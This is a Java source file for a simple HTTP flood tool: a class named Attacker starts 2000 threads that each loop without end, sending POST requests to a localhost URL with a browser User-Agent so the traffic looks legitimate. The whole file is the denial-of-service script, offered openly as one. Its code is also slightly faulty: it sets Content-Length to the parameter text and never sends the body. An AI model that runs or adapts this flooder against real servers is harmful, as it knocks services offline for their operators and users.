

 
   
//it creates 2000 threads each thread is making HTTP post request to the server with the legitimate HTTP header.

public class Attacker { 
 
    public static void main(String... args) throws Exception {
        for (int i = 0; i < 2000; i++) {
            DdosThread thread = new DdosThread();
            thread.start();
        } 
    } 
 
    public static class DdosThread extends Thread {

        //A boolean value that may be updated atomically.When multiple threads need to check and change the boolean.
        private AtomicBoolean running = new AtomicBoolean(true);

        private final String request = "http://localhost:8080/index.htm1";
        private final URL url;
 
        String param = null;
 
        public DdosThread() throws Exception {
            url = new URL(request);
            //param = command line arguments
            param = "param1=" + URLEncoder.encode("87845", "UTF-8");
        } 
 
 
        @Override 
        public void run() { 
            while (running.get()) {
                try { 
                    attack(); 
                } catch (Exception e) {
 
                } 
 
 
            } 
        } 
 
        //sets the properties for the connection
        public void attack() throws Exception {
            //creates a connection
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Host", "localhost");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("Content-Length", param);
            System.out.println(this + " " + connection.getResponseCode());
            connection.getInputStream();
        } 
    } 
 
} 
       
           

    

       
       
